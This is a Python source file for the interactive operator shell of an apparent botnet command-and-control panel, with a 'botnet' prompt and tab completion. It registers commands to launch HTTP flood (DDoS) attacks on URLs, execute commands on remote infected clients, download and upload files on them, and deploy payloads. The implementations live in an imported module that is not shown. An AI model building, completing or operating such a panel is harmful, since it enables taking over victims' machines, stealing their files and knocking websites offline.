import json
import random
from pathlib import Path
import atexit
import readline
import getpass
from colorama import Fore, Style, init
from .commands import Commands

USERS_PERMISSION_TABLE = {
    "root": {"level": 3, "shell_color": Fore.RED},
}


class Command:
    def __init__(self, name, func, level=1, usage="", description=""):
        self.name = name
        self.func = func
        self.level = level
        self.usage = usage
        self.description = description


class Shell:
    def __init__(self, controller):
        init(autoreset=True)
        self.controller = controller
        self.user = getpass.getuser()
        self.user_level = USERS_PERMISSION_TABLE.get(
            self.user, {"level": 1, "shell_color": Fore.GREEN}
        )["level"]
        USERS_PERMISSION_TABLE.setdefault(
            self.user, {"level": 1, "shell_color": Fore.GREEN}
        )
        self.running = True
        self.commands = {
            name: Command(name, func, level, usage, desc)
            for name, func, level, usage, desc in [
                (
                    "help",
                    self._help,
                    1,
                    "help [command]",
                    "Show available commands or details for a specific command",
                ),
                ("quit", self._quit, 1, "quit", "Exit the shell"),
                ("exit", self._quit, 1, "exit", "Exit the shell"),
                (
                    "flood",
                    self._flood,
                    3,
                    "flood <url> [duration] [method] [threads]",
                    "Initiate a flood attack on a URL",
                ),
                (
                    "nodes",
                    self._nodes,
                    2,
                    "nodes <list/status/sync/disconnect> [node_id]",
                    "Manage nodes (list, check status, sync, or disconnect)",
                ),
                (
                    "clients",
                    self._clients,
                    2,
                    "clients <list/disconnect> [node_id] [client_id]",
                    "Manage clients (list all, disconnect client)",
                ),
                (
                    "methods",
                    self._methods,
                    1,
                    "methods",
                    "List available flood methods",
                ),
                ("ping", self._ping, 2, "ping", "Ping all nodes"),
                (
                    "exec",
                    self._exec,
                    3,
                    "exec <node_id> <client_id> <command>",
                    "Execute a command on a remote client",
                ),
                (
                    "download",
                    self._download,
                    3,
                    "download <node_id> <client_id> <path>",
                    "Download a file from a remote client",
                ),
                (
                    "upload",
                    self._upload,
                    3,
                    "upload <node_id> <client_id> <local_file> <remote_path>",
                    "Upload a file to a remote client",
                ),
                (
                    "!",
                    self._shell_exec,
                    3,
                    "! <command>",
                    "Execute a shell command (admin only)",
                ),
                (
                    "payload",
                    self._payload,
                    3,
                    "payload <list|send|add|remove> [params]",
                    "Manage and deploy payloads to clients",
                ),
            ]
        }
        self.commands_impl = Commands(controller, self)
        self._setup_readline()
        self._display_banner()

    def _help(self, shell, args):
        self.commands_impl.help(shell, args)

    def _quit(self, shell, args):
        self.commands_impl.quit(shell, args)

    def _flood(self, shell, args):
        self.commands_impl.flood(shell, args)

    def _nodes(self, shell, args):
        self.commands_impl.nodes(shell, args)

    def _methods(self, shell, args):
        self.commands_impl.methods(shell, args)

    def _ping(self, shell, args):
        self.commands_impl.ping(shell, args)

    def _clients(self, shell, args):
        self.commands_impl.nodes(shell, ["clients"] + args)

    def _exec(self, shell, args):
        self.commands_impl.exec_cmd(shell, args)

    def _download(self, shell, args):
        self.commands_impl.download(shell, args)

    def _upload(self, shell, args):
        self.commands_impl.upload(shell, args)

    def _shell_exec(self, shell, args):
        self.commands_impl.shell_exec(shell, args)

    def _payload(self, shell, args):
        self.commands_impl.payload(shell, args)

    def _setup_readline(self):
        readline.set_completer(self._complete)
        readline.parse_and_bind("tab: complete")
        self.history_file = Path("~/.shell_history").expanduser()
        try:
            if self.history_file.exists():
                readline.read_history_file(self.history_file)
        except (OSError, IOError) as e:
            print(f"{Fore.RED}Error loading history file: {e}{Style.RESET_ALL}")
        readline.set_history_length(1000)
        atexit.register(self._save_history)

    def _display_banner(self):
        try:
            banner_file = Path("core/banners.json")
            if not banner_file.exists():
                raise FileNotFoundError("banners.json not found")
            with banner_file.open("r") as f:
                banners = json.load(f)
            banner = random.choice(banners).encode("utf-8").decode("unicode_escape")
            print(f"{Fore.CYAN}{banner}{Style.RESET_ALL}")
            print()
        except (FileNotFoundError, json.JSONDecodeError) as e:
            print(f"{Fore.RED}Error loading banners: {e}{Style.RESET_ALL}")

    def _complete(self, text, state):
        if text.startswith("nodes "):
            subcommands = ["list", "status", "sync", "clients", "disconnect"]
            subtext = text.split(" ")[1] if len(text.split(" ")) > 1 else ""
            options = [
                f"nodes {subcmd}"
                for subcmd in subcommands
                if subcmd.startswith(subtext)
            ]
            if subtext.startswith("disconnect"):
                nodes = self.controller.get_nodes()
                options.extend(
                    f"nodes disconnect {node_id}"
                    for node_id, _, _ in nodes
                    if node_id.startswith(
                        text.split(" ")[2] if len(text.split(" ")) > 2 else ""
                    )
                )
        elif text.startswith("clients "):
            subcommands = ["list", "count", "find", "show", "disconnect"]
            parts = text.split(" ")
            subtext = parts[1] if len(parts) > 1 else ""
            options = [
                f"clients {subcmd}"
                for subcmd in subcommands
                if subcmd.startswith(subtext)
            ]
            if subtext.startswith("disconnect") and len(parts) == 3:
                nodes = self.controller.get_nodes()
                options.extend(
                    f"clients disconnect {node_id}"
                    for node_id, _, _ in nodes
                    if node_id.startswith(parts[2])
                )
        elif text.startswith("payload "):
            subcommands = ["list", "send", "add", "remove"]
            parts = text.split(" ")
            subtext = parts[1] if len(parts) > 1 else ""
            options = [
                f"payload {subcmd}"
                for subcmd in subcommands
                if subcmd.startswith(subtext)
            ]
        elif text.startswith("flood "):
            parts = text.split(" ")
            if len(parts) == 2:
                options = [
                    f"flood {parts[1]} {method}"
                    for method in sum(self.commands_impl.VALID_METHODS.values(), [])
                ]
            else:
                options = []
        else:
            options = [
                cmd
                for cmd in self.commands
                if cmd.startswith(text) and self.user_level >= self.commands[cmd].level
            ]
        return options[state] if state < len(options) else None

    def _save_history(self):
        try:
            readline.write_history_file(self.history_file)
        except (OSError, IOError) as e:
            print(f"{Fore.RED}Error saving history file: {e}{Style.RESET_ALL}")

    def run(self):
        print(f"Type 'help' for a list of commands{Style.RESET_ALL}\n")
        while self.running:
            try:
                prompt = f"{USERS_PERMISSION_TABLE[self.user]['shell_color']}{self.user}@{Fore.BLUE}botnet{Style.RESET_ALL} $ "
                raw_input = input(prompt).strip()
                if not raw_input:
                    continue

                parts = raw_input.split()
                cmd_name, args = parts[0], parts[1:]

                if cmd_name not in self.commands:
                    print(
                        f"{Fore.RED}Error: Unknown command '{cmd_name}'. Type 'help' for commands.{Style.RESET_ALL}"
                    )
                    continue

                if self.user_level < self.commands[cmd_name].level:
                    print(
                        f"{Fore.RED}Error: Permission denied (Level {self.commands[cmd_name].level} required){Style.RESET_ALL}"
                    )
                    continue

                self.commands[cmd_name].func(self, args)

            except KeyboardInterrupt:
                print(
                    f"\n{Fore.YELLOW}Interrupted. Type 'quit' to exit.{Style.RESET_ALL}"
                )
            except Exception as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
            print("")
